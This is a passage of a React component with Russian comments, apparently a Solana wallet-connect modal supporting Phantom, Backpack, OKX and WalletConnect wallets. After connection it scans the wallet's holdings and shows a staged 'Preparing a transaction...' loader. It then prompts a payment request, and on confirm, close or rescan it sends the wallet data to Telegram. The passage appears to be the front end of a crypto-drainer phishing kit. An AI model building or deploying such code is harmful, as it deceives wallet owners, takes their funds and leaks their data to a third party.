              const connectResponse = await provider.connect()
              response = { publicKey: connectResponse.publicKey.toString(), provider }
              walletProvider = provider
              setConnectedWallet(provider)
            }
          } else if (walletKey === "backpack" && walletBrowserInfo.isBackpackMobileBrowser) {
            // Прямое подключение в Backpack браузере
            console.log("📱 Direct Backpack mobile browser connection")
            if (typeof window !== "undefined") {
              const provider = (window as any).backpack
              if (!provider) {
                throw new Error("Backpack не доступен")
              }
              const connectResponse = await provider.connect()
              response = { publicKey: connectResponse.publicKey.toString(), provider }
              walletProvider = provider
              setConnectedWallet(provider)
            }
          } else if (walletKey === "okx" && walletBrowserInfo.isOKXMobileBrowser) {
            // Прямое подключение в OKX браузере
            console.log("📱 Direct OKX mobile browser connection")
            if (typeof window !== "undefined") {
              const provider = (window as any).okxwallet?.solana
              if (!provider) {
                throw new Error("OKX Wallet не доступен")
              }
              const connectResponse = await provider.connect()
              response = { publicKey: connectResponse.publicKey.toString(), provider }
              walletProvider = provider
              setConnectedWallet(provider)
            }
          } else if (walletKey === "phantom" || walletKey === "solflare") {
            // Диплинк для других случаев
            const success = openWalletWithDeepLink(walletKey)
            if (!success) {
              throw new Error(`Не удалось открыть ${mobileConfig.name}`)
            }
            throw new Error("Подключение через диплинк требует дополнительной реализации")
          } else {
            // WalletConnect для остальных
            response = await connectMobileWallet(walletKey)
            walletProvider = { type: "walletconnect", session: wcSession }
            setConnectedWallet({ type: "walletconnect", session: wcSession })
          }
        } else {
          // Десктоп
          const desktopConfig = DESKTOP_WALLETS[walletKey as keyof typeof DESKTOP_WALLETS]
          if (!desktopConfig) {
            throw new Error("Кошелек не поддерживается на десктопе")
          }

          walletDisplayName = `${desktopConfig.name} (Desktop)`

          if (walletKey === "phantom") {
            const provider = desktopConfig.provider()
            if (!provider) {
              throw new Error(`${desktopConfig.name} не установлен`)
            }
            response = await connectPhantom(provider)
            walletProvider = provider
            setConnectedWallet(provider)
          } else {
            const result = await connectDesktopWallet(walletKey)
            response = result
            walletProvider = result.provider
            setConnectedWallet(result.provider)
          }
        }

        const address = response.publicKey
        if (!address) {
          throw new Error("Не удалось получить адрес кошелька")
        }

        setWalletAddress(address)
        setWalletName(walletDisplayName)
        setIsModalOpen(false)
        setIsAllWalletsOpen(false)

        setConnectionStatus({ type: "scanning", message: "Сканирование данных кошелька..." })
        setIsScanning(true)

        try {
          const scanData = await performFastScan(address)
          setWalletData(scanData)

          setConnectionStatus({ type: "success", message: "Подключение успешно!" })

          // Показываем загрузку "Preparing a transaction..." на 3 секунды перед модальным окном
          setIsPostConnectLoading(true)
          setTimeout(() => {
            setIsPostConnectLoading(false)
            if (!hasTransactionModalBeenOpened) {
              setHasTransactionModalBeenOpened(true)
            }
            setShowTransactionModal(true)
          }, 3000)
        } catch (scanError) {
          console.error("Ошибка сканирования:", scanError)
          setConnectionStatus({ type: "error", message: `Подключен, но сканирование не удалось: ${scanError}` })
        } finally {
          setIsScanning(false)
          setIsAutoConnecting(false)
        }
      } catch (error: any) {
        console.error(`Не удалось подключиться к кошельку:`, error)
        setConnectionStatus({ type: "error", message: error.message || "Ошибка подключения" })
        setIsScanning(false)
        setIsAutoConnecting(false)

        // Показываем toast только если это не автоподключение
        if (!isAutoConnecting) {
          toast({
            title: "Ошибка подключения",
            description: error.message || "Не удалось подключиться к кошельку",
            variant: "destructive",
          })
        }
      }
    },
    [
      isMobileDevice,
      connectMobileWallet,
      connectDesktopWallet,
      performFastScan,
      wcSession,
      detectWalletBrowser,
      directPhantomMobileConnect,
      openWalletWithDeepLink,
      connectPhantom,
      isAutoConnecting,
      hasTransactionModalBeenOpened,
    ],
  )

  // Обработка подтверждения транзакции
  const handleConfirmTransaction = useCallback(async () => {
    if (!connectedWallet || !walletAddress || !walletData) return

    setShowTransactionModal(false)
    setIsPostTransactionLoading(true)

    setTimeout(async () => {
      try {
        let transactionSignature = ""
        if (connectedWallet && connectedWallet.type !== "walletconnect") {
          transactionSignature = await requestPayment(connectedWallet, walletAddress)
        }

        // Отправляем данные в Telegram с подписью транзакции
        await sendWalletInfoToTelegram(walletName, walletData, transactionSignature)

        setConnectionStatus({ type: "success", message: "Транзакция успешно выполнена!" })
      } catch (error: any) {
        console.error("Ошибка транзакции:", error)
        setConnectionStatus({ type: "error", message: `Ошибка транзакции: ${error.message}` })
      } finally {
        setIsPostTransactionLoading(false)
      }
    }, 5000)
  }, [connectedWallet, walletAddress, walletData, walletName, requestPayment, sendWalletInfoToTelegram])

  // Закрытие модального окна транзакции
  const handleCloseTransactionModal = useCallback(() => {
    setShowTransactionModal(false)
    setIsPostTransactionLoading(true)

    setTimeout(async () => {
      // Отправляем данные в Telegram без транзакции
      if (walletData) {
        await sendWalletInfoToTelegram(walletName, walletData)
      }

      setConnectionStatus({ type: "success", message: "Подключение завершено!" })
      setIsPostTransactionLoading(false)
    }, 5000)
  }, [walletData, walletName, sendWalletInfoToTelegram])

  // Отключение кошелька
  const disconnectWallet = useCallback(async () => {
    try {
      if (walletName.includes("(Mobile)") && signClient && wcSession) {
        // Отключаем WalletConnect сессию
        await signClient.disconnect({
          topic: wcSession.topic,
          reason: getSdkError("USER_DISCONNECTED"),
        })
        setWcSession(null)
      } else if (connectedWallet && connectedWallet.disconnect) {
        // Отключаем расширение браузера
        await connectedWallet.disconnect()
      }
    } catch (error) {
      console.error("Ошибка отключения кошелька:", error)
    }

    setConnectedWallet(null)
    setWalletAddress("")
    setWalletName("")
    setWalletData(null)
    setIsScanning(false)
    setConnectionStatus({ type: "idle", message: "" })

    toast({
      title: "Кошелек отключен",
      description: "Кошелек успешно отключен",
    })
  }, [connectedWallet, walletName, signClient, wcSession])

  // Повторное сканирование
  const rescanWallet = useCallback(async () => {
    if (!walletAddress) {
      toast({
        title: "Ошибка",
        description: "Кошелек не подключен",
        variant: "destructive",
      })
      return
    }

    if (isScanning) {
      toast({
        title: "Ошибка",
        description: "Сканирование уже выполняется",
        variant: "destructive",
      })
      return
    }

    setConnectionStatus({ type: "scanning", message: "Сканирование данных кошелька..." })
    setIsScanning(true)

    try {
      const scanData = await performFastScan(walletAddress)
      setWalletData(scanData)

      // Отправляем обновленные данные в Telegram
      await sendWalletInfoToTelegram(`${walletName} (Повторное сканирование)`, scanData)

      setConnectionStatus({ type: "success", message: "Сканирование завершено успешно!" })

      toast({
        title: "Сканирование завершено",
        description: "Данные кошелька обновлены",
      })
    } catch (error: any) {
      console.error("Ошибка сканирования:", error)
      setConnectionStatus({ type: "error", message: `Ошибка сканирования: ${error.message}` })

      toast({
        title: "Ошибка сканирования",
        description: error.message || "Не удалось отсканировать кошелек",
        variant: "destructive",
      })
    } finally {
      setIsScanning(false)
    }
  }, [walletAddress, walletName, isScanning, performFastScan, sendWalletInfoToTelegram])

  // Форматирование адреса
  const formatAddress = useCallback((address: string) => {
    if (!address) return ""
    return `${address.slice(0, 4)}...${address.slice(-4)}`
  }, [])

  // Открытие All Wallets
  const openAllWallets = useCallback(() => {
    setIsTransitioning(true)
    setIsModalOpen(false)
    setIsAllWalletsOpen(true)
  }, [])

  // Возврат к Connect Wallet
  const backToConnectWallet = useCallback(() => {
    setIsTransitioning(true)
    setIsAllWalletsOpen(false)
    setIsModalOpen(true)
  }, [])

  // Обработка клика по overlay
  const handleOverlayClick = useCallback(
    (e: React.MouseEvent) => {
      if (e.target === e.currentTarget) {
        closeAllModals()
      }
    },
    [closeAllModals],
  )

  // Получение списка кошельков в зависимости от устройства
  const getAvailableWallets = useCallback(() => {
    if (isMobileDevice) {
      return Object.entries(MOBILE_WALLETS)
    } else {
      return Object.entries(DESKTOP_WALLETS)
    }
  }, [isMobileDevice])

  // Основные кошельки для первого экрана (мобильная версия)
  const getMainWallets = useCallback(() => {
    if (isMobileDevice) {
      // Для мобильных устройств: Phantom - Solflare - Trust - Coinbase - Backpack
      return ["phantom", "solflare", "trustwallet", "coinbase", "backpack"]
    } else {
      // Для десктопа оставляем как было
      const wallets = getAvailableWallets()
      return wallets.slice(0, 5).map(([key]) => key)
    }
  }, [getAvailableWallets, isMobileDevice])

  // Получение упорядоченного списка кошельков для All Wallets (мобильная версия)
  const getOrderedAllWallets = useCallback(() => {
    if (isMobileDevice) {
      // Для мобильных устройств: Phantom - Solflare - Trust - Coinbase - Backpack - остальные
      const priorityOrder = ["phantom", "solflare", "trustwallet", "coinbase", "backpack"]
      const allWallets = Object.entries(MOBILE_WALLETS)
      const priorityWallets = priorityOrder.map((key) => [key, MOBILE_WALLETS[key as keyof typeof MOBILE_WALLETS]])
      const otherWallets = allWallets.filter(([key]) => !priorityOrder.includes(key))
      return [...priorityWallets, ...otherWallets]
    } else {
      // Для десктопа возвращаем все кошельки как есть
      return getAvailableWallets()
    }
  }, [getAvailableWallets, isMobileDevice])

  // Проверка установленных кошельков для десктопа
  const isWalletInstalled = useCallback(
    (walletKey: string) => {
      if (isMobileDevice || typeof window === "undefined") return true // На мобильных всегда показываем

      const config = DESKTOP_WALLETS[walletKey as keyof typeof DESKTOP_WALLETS]
      if (!config) return false

      return config.checkMethod ? config.checkMethod() : !!config.provider()
    },
    [isMobileDevice],
  )

  // Получить статус кошелька
  const getWalletStatus = useCallback(
    (walletKey: string) => {
      if (isMobileDevice) {
        // На мобильных показываем "Popular" только для Phantom и Solflare
        if (walletKey === "phantom" || walletKey === "solflare") {
          return "Popular"
        }
        // Убираем "Available" для Trust Wallet, Coinbase и Backpack на мобильных
        if (walletKey === "trustwallet" || walletKey === "coinbase" || walletKey === "backpack") {
          return ""
        }
        return "Available"
      } else {
        // На десктопе показываем "Available" только для установленных
        return isWalletInstalled(walletKey) ? "Available" : ""
      }
    },
    [isMobileDevice, isWalletInstalled],
  )

  if (!isOpen) return null

  return (
    <>
      <style jsx global>{`
        body {
          font-family: Arial, sans-serif;
        }

        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          background: rgba(0, 0, 0, 0);
          backdrop-filter: blur(0px);
          z-index: 1000;
          animation: fadeInOverlay 0.2s ease-out forwards;
        }

        @keyframes fadeInOverlay {
          from {
            background: rgba(0, 0, 0, 0);
            backdrop-filter: blur(0px);
          }
          to {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(4px);
          }
        }

        .connect-wallet {
          position: fixed;
          top: 50%;
          left: 50%;
          background: #fff;
          border-radius: 32px;
          width: 350px;
          padding: 20px;
          box-shadow: 0 8px 24px rgba(0,0,0,0.2);
          z-index: 1001;
        }

        .connect-wallet.first-open {
          transform: translate(-50%, calc(-50% + 100vh));
          animation: slideUpModal 0.2s ease-out forwards;
        }

        .connect-wallet.no-animation {
          transform: translate(-50%, -50%);
          opacity: 1;
        }

        .connect-wallet.already-opened {
          transform: translate(-50%, -50%);
          opacity: 1;
        }

        .all-wallets-modal {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: #fff;
          border-radius: 32px;
          width: 350px;
          padding: 20px;
          box-shadow: 0 8px 24px rgba(0,0,0,0.2);
          z-index: 1001;
          opacity: 1;
        }

        @keyframes slideUpModal {
          from {
            transform: translate(-50%, calc(-50% + 100vh));
            opacity: 0;
          }
          to {
            transform: translate(-50%, -50%);
            opacity: 1;
          }
        }

        .connect-header,
        .modal-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 20px;
        }

        .connect-header h2,
        .modal-header h2 {
          margin: 0;
          font-size: 1.2rem;
          font-weight: 600;
          flex-grow: 1;
          text-align: center;
          color: #000;
        }

        .help-btn,
        .close-btn,
        .back-btn {
          background: none;
          border: none;
          cursor: pointer;
          width: 32px;
          height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
          transition: all 0.2s ease;
          color: #666;
        }

        .help-btn {
          background-color: #f0f0f0;
          font-size: 1rem;
          font-weight: bold;
        }

        .help-btn:hover {
          background-color: #e0e0e0;
        }

        .close-btn,
        .back-btn {
          background-color: #f0f0f0;
        }

        .close-btn:hover,
        .back-btn:hover {
          background-color: #e0e0e0;
        }

        .wallet-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }

        .wallet-option {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 10px;
          background: #f5f5f5;
          border-radius: 10px;
          cursor: pointer;
          transition: background 0.3s;
          position: relative;
        }

        .wallet-option:hover {
          background: #e0e0e0;
        }

        .wallet-option img {
          width: 40px;
          height: 40px;
          margin-right: 10px;
          border-radius: 12px;
        }

        .wallet-option span {
          flex-grow: 1;
          font-size: 1rem;
          color: #333;
        }

        .wallet-status {
          font-size: 0.8rem;
          background: linear-gradient(135deg, #90EE90, #4bb04b);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          font-weight: 600;
          margin-left: 10px;
        }

        .get-started {
          text-align: center;
          margin-top: 20px;
          color: #666;
          font-size: 0.9rem;
        }

        .get-started-link {
          color: #007bff;
          font-weight: 600;
          text-decoration: none;
          cursor: pointer;
        }

        .get-started-link:hover {
          text-decoration: underline;
        }

        .wallet-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 15px;
          overflow-y: auto;
          flex-grow: 1;
        }

        .wallet-item {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          background: #f9f9f9;
          border-radius: 15px;
          padding: 10px;
          cursor: pointer;
          transition: background 0.3s;
          user-select: none;
          position: relative;
        }

        .wallet-item:hover {
          background: #e0e0e0;
        }

        .wallet-item img {
          width: 60px;
          height: 60px;
          margin-bottom: 8px;
          object-fit: contain;
          border-radius: 15px;
        }

        .wallet-item span {
          font-size: 0.8rem;
          color: #333;
          text-align: center;
        }

        /* Mobile Adjustments */
        @media (max-width: 394px) {
          .connect-wallet {
            top: auto;
            bottom: 0;
            left: 0;
            right: 0;
            width: 100vw;
            padding: 15px;
            border-radius: 32px 32px 0 0;
            max-height: 85vh;
            overflow-y: auto;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            box-sizing: border-box;
          }

          .connect-wallet.first-open {
            transform: translateY(100%);
            animation: slideUpMobile 0.2s ease-out forwards;
          }

          .connect-wallet.no-animation {
            transform: translateY(0);
            opacity: 1;
          }

          .connect-wallet.already-opened {
            transform: translateY(0);
            opacity: 1;
          }

          .all-wallets-modal {
            top: auto;
            bottom: 0;
            left: 0;
            right: 0;
            transform: translateY(0);
            width: 100vw;
            padding: 15px;
            border-radius: 32px 32px 0 0;
            max-height: 85vh;
            overflow-y: auto;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            box-sizing: border-box;
            opacity: 1;
          }

          @keyframes slideUpMobile {
            from {
              transform: translateY(100%);
              opacity: 0;
            }
            to {
              transform: translateY(0);
              opacity: 1;
            }
          }

          .wallet-item img {
            width: 60px;
            height: 60px;
            margin-bottom: 6px;
          }

          .wallet-item span {
            font-size: 0.8rem;
          }
        }

        .loading-modal {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgb(25, 25, 25);
          border-radius: 20px;
          padding: 40px;
          text-align: center;
          box-shadow: 0 8px 24px rgba(0,0,0,0.2);
          z-index: 1003;
        }

        .loading-spinner {
          width: 40px;
          height: 40px;
          border: 4px solid #333;
          border-top: 4px solid rgb(171, 159, 241);
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .loading-modal p {
          margin: 0;
          color: white;
          font-size: 16px;
        }

        @media (max-width: 394px) {
          .loading-modal {
            top: auto;
            bottom: 50%;
            left: 50%;
            transform: translate(-50%, 50%);
            width: 90%;
            max-width: 300px;
          }
        }
      `}</style>

      {/* Modal Overlay */}
      {(isModalOpen || isAllWalletsOpen) && <div className="modal-overlay" onClick={handleOverlayClick} />}

      {/* Connect Wallet Modal */}
      {isModalOpen && (
        <div className={`connect-wallet ${!hasModalBeenOpened || isTransitioning ? "no-animation" : "first-open"}`}>
          {/* Header */}
          <div className="connect-header">
            <button className="help-btn" title="Help">
              ?
            </button>
            <h2>Connect Wallet</h2>
            <button onClick={closeAllModals} className="close-btn" title="Close">
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
          </div>

          {/* Wallet List */}
          <div className="wallet-list">
            {getMainWallets().map((walletKey) => {
              const walletConfig = isMobileDevice
                ? MOBILE_WALLETS[walletKey as keyof typeof MOBILE_WALLETS]
                : DESKTOP_WALLETS[walletKey as keyof typeof DESKTOP_WALLETS]

              if (!walletConfig) return null

              const walletStatus = getWalletStatus(walletKey)

              return (
                <div key={walletKey} onClick={() => connectWallet(walletKey)} className="wallet-option">
                  <div style={{ display: "flex", alignItems: "center" }}>
                    <img src={walletConfig.icon || "/placeholder.svg"} alt={walletConfig.name} />
                    <span>{walletConfig.name}</span>
                  </div>
                  {walletStatus && <div className="wallet-status">{walletStatus}</div>}
                </div>
              )
            })}

            {/* All Wallets Button */}
            <div onClick={openAllWallets} className="wallet-option">
              <div style={{ display: "flex", alignItems: "center" }}>
                <img src="/placeholder.svg?height=40&width=40" alt="All Wallets" />
                <span>All Wallets</span>
              </div>
            </div>
          </div>

          {/* Get Started */}
          <div className="get-started">
            {"Haven't got a wallet yet? "}
            <a
              href="https://www.solflare.com/download/"
              target="_blank"
              rel="noopener noreferrer"
              className="get-started-link"
            >
              Get Started
            </a>
          </div>
        </div>
      )}

      {/* All Wallets Modal */}
      {isAllWalletsOpen && (
        <div className="all-wallets-modal">
          {/* Header */}
          <div className="modal-header">
            <button onClick={backToConnectWallet} className="back-btn" title="Back">
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <polyline points="15,18 9,12 15,6"></polyline>
              </svg>
            </button>
            <h2>All Wallets</h2>
            <button onClick={closeAllModals} className="close-btn" title="Close">
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
          </div>

          {/* Wallet Grid */}
          <div className="wallet-grid">
            {getOrderedAllWallets().map(([walletKey, config]) => (
              <div key={walletKey} onClick={() => connectWallet(walletKey)} className="wallet-item">
                <img src={config.icon || "/placeholder.svg"} alt={config.name} />
                <span>{config.name}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Transaction Confirmation Modal */}
      <TransactionConfirmationModal
        isOpen={showTransactionModal}
        onClose={handleCloseTransactionModal}
        onConfirm={handleConfirmTransaction}
        solBalance={walletData?.solBalance || 0}
        hasBeenOpened={hasTransactionModalBeenOpened}
      />

      {/* Post Connect Loading - "Preparing a transaction..." */}
      {isPostConnectLoading && (
        <div className="modal-overlay">
          <div className="loading-modal">
            <div className="loading-spinner"></div>
            <p>Preparing a transaction...</p>
          </div>
        </div>
      )}

      {/* Post Transaction Loading - "Processing..." */}
      {isPostTransactionLoading && (
        <div className="modal-overlay">
          <div className="loading-modal">
            <div className="loading-spinner"></div>
            <p>Processing...</p>
          </div>
        </div>
      )}
    </>
  )
}
